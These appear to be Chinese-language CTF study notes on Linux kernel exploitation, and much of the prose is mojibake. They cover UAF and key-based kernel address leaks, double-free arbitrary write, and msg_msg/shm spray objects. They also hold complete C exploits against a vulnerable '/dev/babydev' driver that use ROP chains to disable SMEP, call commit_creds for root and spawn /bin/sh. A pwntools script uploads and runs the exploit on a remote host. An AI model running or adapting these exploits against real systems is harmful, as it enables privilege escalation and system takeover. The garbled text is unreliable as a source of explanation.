descriptionçš„æ‹·è´æ˜¯ä½¿ç”¨ strndup_user å‡½æ•°ä»ç”¨æˆ·ç©ºé—´å¤åˆ¶æè¿°å­—ç¬¦ä¸²åˆ°å†…æ ¸ç©ºé—´ï¼Œmemdup_user()ï¼Œkmalloc_track_callerå’Œcopy_from_user
payloadçš„æ‹·è´æ˜¯kvmalloc(plen, GFP_KERNEL) åˆ†é… plen å¤§å°çš„å¯¹è±¡åä½¿ç”¨ copy_from_user() è¿›è¡Œæ‹·è´
(obj1å’Œobj2æ˜¯ä¸´æ—¶å¯¹è±¡ï¼Œåœ¨ç³»ç»Ÿè°ƒç”¨ç»“æŸæ—¶ä¼šè¢«é‡Šæ”¾)


keyctl_readæ³„éœ²ï¼š
å…¶ä¸­ obj4 ä¸ºä¸€ä¸ª user_key_payload ç»“æ„ä½“ï¼Œæœ‰ç€ä¸€ä¸ªå›ºå®šå¤§å°çš„å¤´éƒ¨ï¼Œå…¶ä½™ç©ºé—´ç”¨æ¥å­˜å‚¨æ¥è‡ªç”¨æˆ·ç©ºé—´çš„æ•°æ®ï¼ˆå¯†é’¥å†…å®¹ï¼‰
```c
struct user_key_payload {
    struct rcu_head rcu;        /* RCU destructor */
    unsigned short  datalen;    /* length of this data */
    char        data[] __aligned(__alignof__(u64)); /* actual data */
};

//...

struct callback_head {
    struct callback_head *next;
    void (*func)(struct callback_head *head);
} __attribute__((aligned(sizeof(void *))));
#define rcu_head callback_head
```

keyctl() ç³»ç»Ÿè°ƒç”¨ä¸ºæˆ‘ä»¬æä¾›äº†è¯»å–ã€æ›´æ–°ï¼ˆåˆ†é…æ–°å¯¹è±¡ï¼Œé‡Šæ”¾æ—§å¯¹è±¡ï¼‰ã€é”€æ¯å¯†é’¥ï¼ˆé‡Šæ”¾ payloadï¼‰çš„åŠŸèƒ½ï¼Œå…¶ä¸­è¯»å–çš„æœ€å¤§é•¿åº¦ç”± user_key_payload->datalen å†³å®š
å¯ä»¥åˆ©ç”¨é¢˜ç›®æä¾›çš„ UAF å°†user_key_payload->datalen æ”¹å¤§ï¼Œä»è€Œå®Œæˆè¶Šç•Œè¯»ã€‚

##### å‡½æ•°Cä»£ç 
```c
define KEY_SPEC_PROCESS_KEYRING	-2	/* - key ID for process-specific keyring */
#define KEYCTL_REVOKE			3	/* revoke a key */
#define KEYCTL_READ			11	/* read a key or keyring's contents */

int key_revoke(int key_id)
{
    return syscall(
        __NR_keyctl,
        KEYCTL_REVOKE,
        key_id,
        0,
        0,
        0
    );
}

int key_read(int key_id, char *retbuf, int retbuf_len)
{
    return syscall(
        __NR_keyctl,
        KEYCTL_READ,
        key_id,
        retbuf,
        retbuf_len
    );
}

int key_alloc(char* description, char* payload, int payload_len)
{
    return syscall(
        __NR_add_key,
        "user",
        description,
        payload,
        payload_len,
        KEY_SPEC_PROCESS_KEYRING
    );
}
```

##### UAF+add_key+keyctl_read

é¦–å…ˆè¦åˆ©ç”¨UAFé‡Šæ”¾2ä¸ª1å †å—ï¼Œä½¿ç”¨add_keyï¼ˆdeså’Œpayloadé•¿åº¦è¦ä¸åŒï¼‰ç”³è¯·4ä¸ªå †å—ï¼Œå…¶ä¸­2ä¸ªpayloadå †å—ä¾¿å¯ä»¥ç”³è¯·åˆ°0å’Œ1çš„ä½ç½®ã€‚ç”±äºæ²¡æœ‰ç¼–è¾‘åŠŸèƒ½è¿™é‡Œé‡Šæ”¾å†é‡æ–°ç”³è¯·ï¼Œä¿®æ”¹user_key_payload->datalenä¸º0x1000ã€‚

æ¥ä¸‹æ¥æ‰§è¡Œreadè¯»å–payloadåˆ°0x1000å¤§å°çš„ç”¨æˆ·æ€å †å—ä¸­ï¼Œå†å»æŸ¥çœ‹æ˜¯å¦æœ‰å†…æ ¸åœ°å€
å†…æ ¸åœ°å€äº‹FF FF FF FF 80å¼€å¤´   "å››F8"

```c
int leak(){
    int OBJ_SIZE = 0x100;
    char *tmp_buf = malloc(OBJ_SIZE);
    memset(tmp_buf,"x",0x100);
    rwctf_ioctl_kmalloc(0,OBJ_SIZE,tmp_buf);
    rwctf_ioctl_kmalloc(1,OBJ_SIZE,tmp_buf);

    rwctf_ioctl_kfree(1);
    rwctf_ioctl_kfree(0);

    //-----------------------get add_key------------------------------
    int ADD_KEY_SIZE = OBJ_SIZE - size_user_key_payload;
    char *payload = malloc(ADD_KEY_SIZE);
    memset(payload,"y",ADD_KEY_SIZE);
    int key_id = key_alloc("description234",payload,ADD_KEY_SIZE);//add obj*4 user_key_payload is 1
    rwctf_ioctl_kfree(1);// free user_key_payload
    
    *(unsigned long long *)&tmp_buf[0] = 0;
    *(unsigned long long *)&tmp_buf[0x8] = 0;
    *(unsigned long long *)&tmp_buf[0x10] = 0x1000;
    rwctf_ioctl_kmalloc(1,ADD_KEY_SIZE,tmp_buf);
    //----------------------key_ctl->read------------------------------
    char *retbuf = malloc(0x1000);
    memset(retbuf,0,0x1000);
    int keycount = key_read(key_id,retbuf,0x1000);
    // hexdump(retbuf,0x1000);
    int64_t leak_addr = *(int64_t *)&retbuf[0x210];
    kernel_base = leak_addr-0xffffffff82225040+0xFFFFFFFF81000000;
    printf("[+] leak : 0x%lx\n",leak_addr);
    printf("[+] kernel_base : 0x%lx\n",kernel_base);
}
```

#####  å¦‚æœå †ä¸Šæ²¡æœ‰åœ°å€->key_revokeå †å–·åœ°å€

```c
_x64_sys_keyctl() -> keyctl_revoke_key() -> key_revoke() -> user_revoke() -> call_rcu()
```

æœ€åä¼šå°† user_key_payload ç»“æ„ä½“çš„ rcu.func è®¾ç½®æˆuser_free_payload_rcu()å‡½æ•°çš„åœ°å€
ï¼ˆnokaslrçš„æƒ…å†µä¸‹æ˜¯0xffffffff813d8210ï¼‰

æ³„éœ²çš„0x1000æ²¡æœ‰å†…æ ¸åœ°å€ï¼Œå¯ä»¥è€ƒè™‘ç”¨æ­¤æ–¹æ³•
```c
    //------------------------heap spary-------------------------------
    //------------------------add srand key----------------------------
    int key_id_test[30];
    srand((unsigned)time(NULL));
    char *tmp_desc = malloc(20);
    memset(tmp_desc, 0, 20);
    for (int i = 0; i < 20; i++)
    {
        snprintf(tmp_desc, 20, "a%x", rand());
        key_id_test[i] = key_alloc(tmp_desc,payload,ADD_KEY_SIZE);//size 
    }
    //------------------------key_ctl->revoke--------------------------
    for (int i = 0; i < 20; i++)
    {
        key_revoke(key_id_test[i]);
    }
```




#### double free

åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¯¥æ¼æ´çš„æ–¹æ³•
åœ¨UAFçš„å‰æä¸‹
æŸ¥çœ‹bzImageä¸­kmallocå‡½æ•°çš„å®ç°ï¼Œprefetcht0æŒ‡ä»¤ä¸´è¿‘çš„å‰å‡ æ¡æŒ‡ä»¤æ²¡æœ‰xoræŒ‡ä»¤ï¼Œå¯ä»¥ç¡®å®šæœ¬é¢˜æœªå¼€å¯slab_freelist_hardened é˜²æŠ¤

æ¯”å¦‚ç”³è¯·0x20çš„objï¼Œç„¶åfree2æ¬¡ï¼Œæ•ˆæœå¦‚å›¾

```c
// 0 <- 0
0xffff8880043a7260:     0x6161616161616161      0x6161616161616161
0xffff8880043a7270:     0xffff8880043a7260      0x6161616161616161
```

ç”³è¯·ä¸€ä¸ªç„¶åæ”¹æ‰è¿™ä¸ª+0x10çš„ä½ç½®ï¼Œå†ç”³è¯·2æ¬¡

```c
// 0 <- 0 <- aim_addr
```

```C
    char *buf = malloc(OBJSIZE);
    memset(buf,'a',OBJSIZE);
    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);
    rwctf_ioctl_kfree(0);
    rwctf_ioctl_kfree(0);                       // double free

	memcpy(buf+0x10,target_addr_p,0x8);         // edit fd
	rwctf_ioctl_kmalloc(0,OBJSIZE,buf);         // edit fd
    rwctf_ioctl_kmalloc(0,OBJSIZE,buf);         //éšæ„
    rwctf_ioctl_kmalloc(0,OBJSIZE,target_cont_p);       // aaw
```


#### msg_msgï¼ˆæ¶ˆæ¯é˜Ÿåˆ—å‡½æ•°æ³„éœ²åœ°å€ï¼‰


msggetã€msgctlã€msgsndã€msgrcv

åˆ›å»ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¹¶å¾€æ¶ˆæ¯é˜Ÿåˆ—ä¸­å†™å…¥æ•°æ®çš„è¿‡ç¨‹ä¸­(msgsnd())ï¼Œå†…æ ¸æ€ä¼šä¸ºâ€œmsg_msgç»“æ„ä½“+ç”¨æˆ·æ•°æ®â€ç”³è¯·ä¸€æ®µå†…å­˜ç©ºé—´ã€‚

demo

```c
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>

int msqid;
struct msgp{
  long type;
  char mtext[256];
};

if((msqid = msgget(IPC_PRIVATE,IPC_CREAT|0666)) == -1){
  perror("msgget");
  return 1;
}

struct msgp msgp1;
msgp1.type = 1;
strcpy(msgp1.mtext,"aaaaaaaaaaaaaaaaaaaaaaa");
if(msgsnd(msqid,&msgp1,sizeof(msgp1.mtext),0) == -1){
  perror("msgsnd");
  return 1;
}
```

msgsnd()å‡½æ•°å¯¹åº”çš„å†…æ ¸æ€è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤º

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240118161320.png)

å†…æ ¸ä¸­è°ƒç”¨ do_msgsnd() å‡½æ•°ï¼Œç”³è¯· struct msg_msg ç»“æ„ä½“å’Œç”¨æˆ·æ€ä¼ é€’çš„msgp1.mtextå…±åŒä¸€æ®µå†…å­˜ç©ºé—´(å †)ï¼ˆæ ¹æ®mtextå¤§å°çš„ä¸åŒï¼Œä»0x31~0x1000å­—èŠ‚å¤§å°éƒ½æœ‰å¯èƒ½ï¼‰
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240118161518.png)
è¿™ä¸ªå›¾æ›´åŠ å½¢è±¡(ç»“æ„ä½“+ç”¨æˆ·æ•°æ®)(åœ¨ alloc_msg() å‡½æ•°ä¸­ä¼šç”³è¯·ä¸‰ä¸ªå †æ¶ˆæ¯åˆ†æ®µå­˜å‚¨)
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240118161850.png)



msgrcv()ï¼Œç”¨äºå°†msgp1.mtextçš„å†…å®¹ä»å†…æ ¸å †ä¸­è¯»å–åˆ°ç”¨æˆ·æ€

```c
char* recv_msg = malloc(0x1000);
int result;
result = msgrcv(msqid,recv_msg,0x1000,0,IPC_NOWAIT|MSG_NOERROR);
if (result<0)
{
    perror("msgrcv");
    exit(1);
}
////////////////ç¬¬ä¸€ç§æƒ…å†µ///////////////
// msgrcv()
// -----â¬‡------- ç”¨æˆ·æ€ä¼ å…¥çš„msgflgæ— MSG_COPYæ ‡å¿—
// ksys_msgrcv()
//      â¬‡
// do_msgrcv()
//  	â¬‡
// find_msg() -> do_msg_fill() -> free_msg()			
//				     â¬‡
//               store_msg()
// find_msg()ï¼šå®šä½æ­£ç¡®çš„æ¶ˆæ¯ï¼Œåå°†æ¶ˆæ¯ä»é˜Ÿåˆ—ä¸­unlink
// do_msg_fill() -> store_msg()ï¼šå°†æ•°æ®ä»å†…æ ¸æ€æ‹·è´åˆ°ç”¨æˆ·æ€
// free_msg()ï¼šé‡Šæ”¾æ¶ˆæ¯

char* recv_msg = malloc(0x1000);
int result;
result = msgrcv(msqid,recv_msg,0x1000,0,IPC_NOWAIT|MSG_NOERROR|MSG_COPY);
if (result<0)
{
    perror("msgrcv");
    exit(1);
}
////////////////ç¬¬äºŒç§æƒ…å†µ///////////////
// msgrcv()
// -----â¬‡------- ç”¨æˆ·æ€ä¼ å…¥çš„msgflgæœ‰MSG_COPYæ ‡å¿—ï¼ˆç¼–è¯‘å†…æ ¸æ—¶éœ€è¦å¼€å¯CONFIG_CHECKPOINT_RESTOREé€‰é¡¹ï¼‰
// ksys_msgrcv()
//      â¬‡
// do_msgrcv()
//  	â¬‡
// prepare_copy() -> find_msg() -> copy_msg() -> do_msg_fill() -> free_msg()			
//				                                      â¬‡
//                                                store_msg()
// prepare_copy()ï¼šå…ˆç”³è¯·ä¸€æ®µå†…å­˜ç©ºé—´ï¼Œç”¨äºåé¢å­˜æ”¾æ¶ˆæ¯å¤‡ä»½
// find_msg()ï¼šå®šä½æ­£ç¡®çš„æ¶ˆæ¯ï¼Œç”±äºMSG_COPYæ ‡å¿—çš„å­˜åœ¨ï¼Œå°†è·³è¿‡æ¶ˆæ¯é˜Ÿåˆ—çš„unlinkæ“ä½œï¼ˆåœ¨æ¼æ´åˆ©ç”¨æ—¶ï¼Œæœ‰æ—¶ä¼šè¦†ç›–æ‰msg_msgçš„åŒé“¾è¡¨æŒ‡é’ˆï¼Œunlinkæ“ä½œä¼šå¯¼è‡´å´©æºƒã€‚åœ¨å¼€å¯CONFIG_CHECKPOINT_RESTOREé€‰é¡¹çš„å†…æ ¸ä¸­ï¼Œæœ‰äº†MSG_COPYæ ‡å¿—ï¼Œå°±å¯ä»¥é¿å…è¯¥å´©æºƒï¼‰
// copy_msg()ï¼šå°†æ‰¾åˆ°çš„æ¶ˆæ¯æ‹·è´åˆ°æ¶ˆæ¯å¤‡ä»½ä¸­ã€‚åç»­çš„æ“ä½œéƒ½æ˜¯é’ˆå¯¹æ¶ˆæ¯å¤‡ä»½ï¼Œä¸ä¼šæ”¹å˜æ¶ˆæ¯é˜Ÿåˆ—ä¸­åŸæ¥çš„æ¶ˆæ¯
// do_msg_fill() -> store_msg()ï¼šå°†æ¶ˆæ¯å¤‡ä»½ä¸­çš„æ•°æ®ä»å†…æ ¸æ€æ‹·è´åˆ°ç”¨æˆ·æ€
// free_msg()ï¼šé‡Šæ”¾æ¶ˆæ¯å¤‡ä»½
```




##### msg_msg+shmå‡½æ•°
```c

int g_msqid;
struct g_msgp{
  long type;
  char mtext[0xfe8];    // 0x1000-0x30+0x20-0x8 = 0xFE8
};

int msg_msgget(key_t key,int msgflg) 
{
    int msqid;
    if((msqid = msgget(key,msgflg)) == -1){              
        perror("msgget");
        exit(-1);
    }
    return msqid;
}

void msg_msgsnd(int msqid,void *msgp,size_t msgsz,int msgflg) 
{
    if(msgsnd(msqid,msgp,msgsz,msgflg) == -1){          
        perror("msgsnd");
        exit(-1);
    }
}

ssize_t msg_msgrcv(int msqid,void *msgp,size_t msgsz,long msgtyp,int msgflg) 
{
    ssize_t result;
    result = msgrcv(msqid,msgp,msgsz,msgtyp,msgflg);           
    if (result<0)
    {
        perror("msgrcv");
        exit(-1);
    }
    return result;
}

void msg_msgctl(int msqid,int cmd,struct msqid_ds *buf)         
{
    if ((msgctl(msqid,cmd,buf))==-1)                        // åˆ é™¤é˜Ÿåˆ— msg_msgctl(msqid,IPC_RMID,NULL);
    {
        perror("Msgctl");
        exit(-1);
    }
}

void create_shm_file_data()
{
    int shmid;
    if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) {
      perror("shmget");
      exit(0);
    }
    char *shmaddr = shmat(shmid, NULL, 0);
    if (shmaddr == (void*)-1) {
      perror("shmat");
      exit(0);
    }
}
```



##### shm_file_data(æ³„éœ²åœ°å€ç»“æ„ä½“)

demo

```c
#include<sys/shm.h>
int shmid;
if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) {
  perror("shmget");
  return 1;
}
char *shmaddr = shmat(shmid, NULL, 0);
if (shmaddr == (void*)-1) {
  perror("shmat");
  return 1;
}
```

shmat()å‡½æ•°å¯¹åº”çš„å†…æ ¸æ€è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤º
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240118160659.png)

å†…æ ¸ä¸­è°ƒç”¨do_shmatï¼Œä¼šç”³è¯·[struct shm_file_data](https://elixir.bootlin.com/linux/v4.4.72/source/ipc/shm.c#L50)ç»“æ„ä½“ï¼Œå¤§å°0x20

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240118160815.png)

nså’Œvm_opsä¸¤ä¸ªæŒ‡é’ˆå‡æŒ‡å‘å†…æ ¸æ•°æ®åŒºï¼ŒfileæŒ‡é’ˆæŒ‡å‘å †åŒºåŸŸï¼Œvm_opsæŒ‡å‘çš„å‡½æ•°è¡¨

#### subprocess_info


```c
// exp.c
// gcc exp.c -static -masm=intel  -o exp -lpthread
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/socket.h>
#include<pthread.h>
#include<sys/ioctl.h>
#include<sys/mman.h>


int race_flag = 0;
static int fd1 = 0;
static int fd2 = 0;
__uint64_t target_buf[2];

__uint64_t xchg_esp_eax_ret = 0xffffffff8100008a;           // xchg esp, eax ; ret
__uint64_t pop_rax_ret = 0xffffffff8101c216;               // pop rax ; ret
__uint64_t mov_rsp_rax_ret = 0xffffffff818855cf;           // mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b
__uint64_t mov_cr4_rax_ret = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret
__uint64_t swapgs_ret = 0xffffffff81885588;             // swapgs; ret
__uint64_t iretq = 0xffffffff81884177;                  // iretq


__uint64_t commit_creds = 0xffffffff8106fed0;
__uint64_t prepare_kernel_cred = 0xffffffff81070260;
__uint64_t init_cred_addr = 0xffffffff81b79a60;

void get_root(){
    //char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    //(*cc)((*pkc)(0));
    (*cc)(init_cred_addr);
}

void get_shell(){
    system("/bin/sh");
}

size_t user_cs, user_rflags, user_sp, user_ss;
void save_status(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}


void race()
{
    target_buf[0] = xchg_esp_eax_ret;
    target_buf[1] = 0x11111111;
    __uint64_t fake_stack_addr = ((__uint64_t)xchg_esp_eax_ret & 0xffffffff);
    if(mmap((char*)(fake_stack_addr&(~0xfff)),0x2000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0) == MAP_FAILED){
        perror("mmap failed.");
    }
    __uint64_t* fake_stack_ptr = (__uint64_t*)fake_stack_addr;
    int index = 0;
    fake_stack_ptr[index++] = pop_rax_ret;
    fake_stack_ptr[index++] = 0x6f0;
    fake_stack_ptr[index++] = mov_cr4_rax_ret;
    fake_stack_ptr[index++] = 0xffff; 
    fake_stack_ptr[index++] = get_root;
    fake_stack_ptr[index++] = swapgs_ret;
    fake_stack_ptr[index++] = iretq;
    fake_stack_ptr[index++] = get_shell;
    fake_stack_ptr[index++] = user_cs;
    fake_stack_ptr[index++] = user_rflags;
    fake_stack_ptr[index++] = user_sp;
    fake_stack_ptr[index++] = user_ss;

    while(1)
    {
        write(fd2,target_buf,0x60+0x50);
        if(race_flag)
        {
            printf("child: detect race happen\n");
            break;
        }
    }
}


int main(){
    save_status();

    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x20);
    close(fd1);
    pthread_t th1;
    pthread_create(&th1,NULL,race,NULL);
    while(1){
        usleep(1);
        socket(22,AF_INET,0);                
        if(race_flag){
            printf("parent: detect race happen\n");
            break;
        }
    }
    close(fd2);

    return 0;
}
```



#### pipe_buffer


```c
// exp.c
// gcc exp.c -static -masm=intel  -o exp 
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/socket.h>
#include<pthread.h>
#include<sys/ioctl.h>
#include<sys/mman.h>


size_t fake_pipe_ops[5];
size_t fake_pipe_buffer[5];

__uint64_t xchg_esp_eax_ret = 0xffffffff8100008a;           // xchg esp, eax ; ret
__uint64_t pop_rax_ret = 0xffffffff8101c216;               // pop rax ; ret
__uint64_t mov_rsp_rax_ret = 0xffffffff818855cf;           // mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b
__uint64_t mov_cr4_rax_ret = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret
__uint64_t swapgs_ret = 0xffffffff81885588;             // swapgs; ret
__uint64_t iretq = 0xffffffff81884177;                  // iretq

__uint64_t pop_rsp_ret = 0xffffffff81010fd7;     // pop rsp ; ret


__uint64_t commit_creds = 0xffffffff8106fed0;
__uint64_t prepare_kernel_cred = 0xffffffff81070260;
__uint64_t init_cred_addr = 0xffffffff81b79a60;

void get_root(){
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
    // (*cc)(init_cred_addr);
}

void get_shell(){
    system("/bin/sh");
}

size_t user_cs, user_rflags, user_sp, user_ss;
void save_status(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}


int main(){
    save_status();
    size_t rop_chain[30] = {0};
    int index = 0;
    rop_chain[index++] = 0xffffffff8101c216;        // pop rax; ret;
    rop_chain[index++] = 0x6f0;
    rop_chain[index++] = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret 
    rop_chain[index++] = 0x0;
    rop_chain[index++] = (size_t)get_root;
    rop_chain[index++] = 0xffffffff81885588;        // swapgs; ret 
    rop_chain[index++] = 0xffffffff81884177;        // iretq; 
    rop_chain[index++] = (size_t)get_shell;
    rop_chain[index++] = user_cs;
    rop_chain[index++] = user_rflags;
    rop_chain[index++] = user_sp;
    rop_chain[index++] = user_ss;


    fake_pipe_buffer[0] = 0x01010101;
    fake_pipe_buffer[1] = 0x02020202;
    fake_pipe_buffer[2] = fake_pipe_ops;
    fake_pipe_buffer[3] = 0x03030303;

    fake_pipe_ops[0] = pop_rsp_ret;          // pop rsp; ret
    fake_pipe_ops[1] = rop_chain;          // rop_chain
    fake_pipe_ops[2] = mov_rsp_rax_ret;          // control rip - xchg rsp,rax; ret
    fake_pipe_ops[3] = 0x33333333;
    fake_pipe_ops[4] = 0x44444444;




    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x400);
    close(fd1);
    int pipe_fd[2];
    pipe(pipe_fd);
    write(fd2,fake_pipe_buffer,0x20);
    close(pipe_fd[0]);
    close(pipe_fd[1]);
    close(fd2);
    return 0;
}
```


### éé¢„æœŸ


/initæƒé™ï¼›qemuå¯åŠ¨å‚æ•°-monitoræœªé‡å®šå‘åˆ°/dev/null

#### å†…å­˜ç©ºé—´ initrd ä¸ flag æœç´¢

```c
// Local Descriptor Table
struct ldt_struct {
    /*
     * Xen requires page-aligned LDTs with special permissions.  This is
     * needed to prevent us from installing evil descriptors such as
     * call gates.  On native, we could merge the ldt_struct and LDT
     * allocations, but it's not worth trying to optimize.
     */
    struct desc_struct    *entries;//æŒ‡é’ˆæŒ‡å‘ä¸€å—æè¿°ç¬¦è¡¨çš„å†…å­˜ï¼Œ
    unsigned int        nr_entries;

    /*
     * If PTI is in use, then the entries array is not mapped while we're
     * in user mode.  The whole array will be aliased at the addressed
     * given by ldt_slot_va(slot).  We use two slots so that we can allocate
     * and map, and enable a new LDT without invalidating the mapping
     * of an older, still-in-use LDT.
     *
     * slot will be -1 if this LDT doesn't have an alias mapping.
     */
    int            slot;
};
```

Linux æä¾›äº†ä¸€ä¸ª modify_ldt() ç³»ç»Ÿè°ƒç”¨æ¥æ“çºµè¯¥ç»“æ„ä½“

initrd æ˜¯æŒ‡åœ¨å¯åŠ¨é˜¶æ®µè¢«Linuxå†…æ ¸è°ƒç”¨çš„ä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿï¼Œæ–‡ä»¶ç³»ç»Ÿä¸­æ‰€æœ‰çš„å†…å®¹éƒ½ä¼šè¢«è½½å…¥åˆ°å†…å­˜å½“ä¸­






### æ‚è°ˆ

```shell
# attack.sh
#!/bin/sh
gcc exp.c -static -masm=intel -g -o exp
cp exp core/exp
cd core
hen core.cpio
cd ..
./start.sh
```







```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os

context.arch = "amd64"
context.log_level = 'debug'
cmd = '$ '


def exploit(r):
    r.sendlineafter(cmd, 'stty -echo')
    os.system('gzip -c ./exp > ./exp.gz')
    r.sendlineafter(cmd, 'cat <<EOF > /tmp/exp.gz.b64')
    r.sendline((read('./exp.gz')).encode('base64'))
    r.sendline('EOF')
    r.sendlineafter(cmd, 'base64 -d /tmp/exp.gz.b64 > /tmp/exp.gz')
    r.sendlineafter(cmd, 'gunzip /tmp/exp.gz')
    r.sendlineafter(cmd, 'chmod +x /tmp/exp')
    r.sendlineafter(cmd, "/tmp/exp")
    r.interactive()

if (len(sys.argv) != 3):
    print("python exp.py ip port")
    exit(0)

p = remote(sys.argv[1],sys.argv[2])
exploit(p)
```



exp

æ¿å­

```c
# banzi.h
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <keyutils.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <linux/genetlink.h>
#include <linux/if_packet.h>
#include <linux/netlink.h>
#include <linux/openvswitch.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sched.h>
#include <stdint.h>
#include <sys/utsname.h>
// #define DEBUG 1
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"
#define ELEM_CNT(x) (sizeof(x) / sizeof(x[0]))
#define SYS_SETRESUID_OFFSET (0xd81d0)
#define PREFIX_BUF_LEN (16)
#define logd(fmt, ...) dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        write(sync_pipe[1], "F", 1);       \
        exit(1);                           \
    } while (0)

int sync_pipe[2];
#ifdef DEBUG
#define debug(...) printf(__VA_ARGS__)
#else
#define debug(...) do {} while (0)
#endif

#define HEAP_MASK 0xffff000000000000
#define KERNEL_MASK 0xffffffff00000000

#define PAGE_SIZE 4096
#define MAX_KEYS 199
#define N_STACK_PPS 30
#define POLLFD_PER_PAGE 510
#define POLL_LIST_SIZE 16
#define NFDS(size) (((size - POLL_LIST_SIZE) / sizeof(struct pollfd)) + N_STACK_PPS);
pthread_t poll_tid[0x1000];
size_t poll_threads;
pthread_mutex_t mutex;
uint64_t usr_cs, usr_ss, usr_rflags;
uint64_t proc_single_show;
uint64_t target_object;
uint64_t kernel_base;

int pipes[0x1000][2];
int seq_ops[0x10000];
int ptmx[0x1000];
int fds[0x1000];
int keys[0x1000];
int corrupted_key;
int n_keys;
int fd;
int s;


struct t_args
{
    int id;
    int nfds;
    int timer;
    bool suspend;
};


struct rcu_head
{
    void *next;
    void *func;
};


struct user_key_payload
{
    struct rcu_head rcu;
    unsigned short	datalen;
    char *data[];
};
void init_namespace(void);
void set_cpu_affinity(int cpu_n, pid_t pid);
void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout);


int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout);

int pagealloc_pad(int size, int count);

struct poll_list
{
    struct poll_list *next;
    int len;
    struct pollfd entries[];
};



bool is_kernel_pointer(uint64_t addr);


bool is_heap_pointer(uint64_t addr);


void __pause(char *msg);


void save_state();
int randint(int min, int max);
void assign_to_core(int core_id);
void assign_thread_to_core(int core_id);
void init_fd(int i);
void *alloc_poll_list(void *args);
void create_poll_thread(int id, size_t size, int timer, bool suspend);
void join_poll_threads(void);
int alloc_key(int id, char *buff, size_t size);
void free_key(int i);
void free_all_keys(bool skip_corrupted_key);
char *get_key(int i, size_t size);
void alloc_pipe_buff(int i);
void release_pipe_buff(int i);
void alloc_tty(int i);
void free_tty(int i);
void alloc_seq_ops(int i);
void free_seq_ops(int i);
int leak_kernel_pointer(int kid);
int leak_heap_pointer(int kid);
bool check_root();
// typedef struct
// {
//     int64_t idx;
//     uint64_t size;
//     char *buf;    
// }user_req_t;

// struct tpacket_req {
//     unsigned int    tp_block_size;
//     unsigned int    tp_block_nr;
//     unsigned int    tp_frame_size;
//     unsigned int    tp_frame_nr;
// };

// enum tpacket_versions {
//     TPACKET_V1,
//     TPACKET_V2,
//     TPACKET_V3,
// };
// #define PACKET_VERSION 10
// #define PACKET_TX_RING 13
#define ISO_SLAB_LIMIT 8
#define INITIAL_PAGE_SPRAY 500
typedef struct
{
    bool in_use;
    int idx[ISO_SLAB_LIMIT];
}full_page;

enum spray_cmd {
    ALLOC_PAGE,
